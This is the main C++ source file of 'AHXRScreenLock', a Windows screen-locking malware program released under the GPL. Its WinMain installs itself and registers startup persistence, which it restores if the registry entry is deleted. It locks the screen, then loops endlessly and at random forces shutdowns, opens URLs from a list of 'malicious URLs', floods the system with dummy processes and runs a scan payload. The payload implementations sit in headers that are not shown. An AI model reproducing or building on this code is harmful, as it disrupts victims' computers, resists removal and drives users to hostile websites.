/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"stdafx.h"
#include					"directory.h"
#include					"payload_shutdown.h"
#include					"payload_startup.h"
#include					"payload_malicious.h"
#include					"payload_install.h"
#include					"payload_dummy.h"
#include					"payload_scan.h"
#include					"payload_lock.h"

#include					<iostream>
#include					<ctime>

//#define						WINDOWS_CONSOLE

#ifdef WINDOWS_CONSOLE
void main() {
#else
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow){
#endif
	STARTUP_PAYLOAD();
	INSTALL_PAYLOAD();
	SHUTDOWN_PAYLOAD();
	readMaliciousURLs();

	// Flood prevention
	Sleep(5000);
	START_DUMMY_PAYLOAD();
	LOCK_PAYLOAD();
	//Sleep(1000000);

	int i_random_result;
	bool b_made_dummy = false;
	srand(time(NULL));

	while (1) {
		// Restarting start-up payload if something deletes registry.
		if (isStartupRegistered())
			STARTUP_PAYLOAD();

		i_random_result = rand() % 5;
		switch (i_random_result) {
			case 0: {
				SHUTDOWN_PAYLOAD();
				break;
			}
			case 1: {
				openRandomMaliciousURL();
				break;
			}
			case 2: {
				if (!b_made_dummy) {
					START_DUMMY_PAYLOAD();
					b_made_dummy = true;
				}
				break;
			}
			case 3: { // Flooding
				for (int i = 0; i < 5; i++) {
					SHUTDOWN_PAYLOAD();
					Sleep(500);
					START_DUMMY_PAYLOAD();
				}
				break;
			}
			case 4: {
				SCAN_PAYLOAD();
				break;
			}
		}

		Sleep(300000);
	}
#ifndef WINDOWS_CONSOLE
    return 0;
#endif
}

